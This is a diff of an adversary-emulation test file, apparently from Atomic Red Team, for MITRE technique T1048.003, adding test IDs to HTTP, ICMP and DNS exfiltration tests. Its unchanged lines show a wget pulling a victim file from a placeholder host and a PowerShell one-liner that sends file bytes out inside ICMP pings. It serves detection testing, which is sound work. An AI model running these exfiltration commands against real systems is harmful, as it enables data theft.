@@ -1,8 +1,8 @@
-attack_technique:
-- T1048.003
+attack_technique: T1048.003
 display_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
 atomic_tests:
 - name: Exfiltration Over Alternative Protocol - HTTP
+  auto_generated_guid: 1d1abbd6-a3d3-4b2e-bef5-c59293f46eff
   description: |
     A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
 
@@ -27,6 +27,7 @@ atomic_tests:
           wget http://VICTIM_IP:1337/victim-file.txt
     name: manual
 - name: Exfiltration Over Alternative Protocol - ICMP
+  auto_generated_guid: dd4b4421-2e25-4593-90ae-7021947ad12e
   description: |
     Exfiltration of specified file over ICMP protocol.
 
@@ -47,6 +48,7 @@ atomic_tests:
       $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
     name: powershell
 - name: Exfiltration Over Alternative Protocol - DNS
+  auto_generated_guid: c403b5a4-b5fc-49f2-b181-d1c80d27db45
   description: |
     Exfiltration of specified file over DNS protocol.
   supported_platforms:
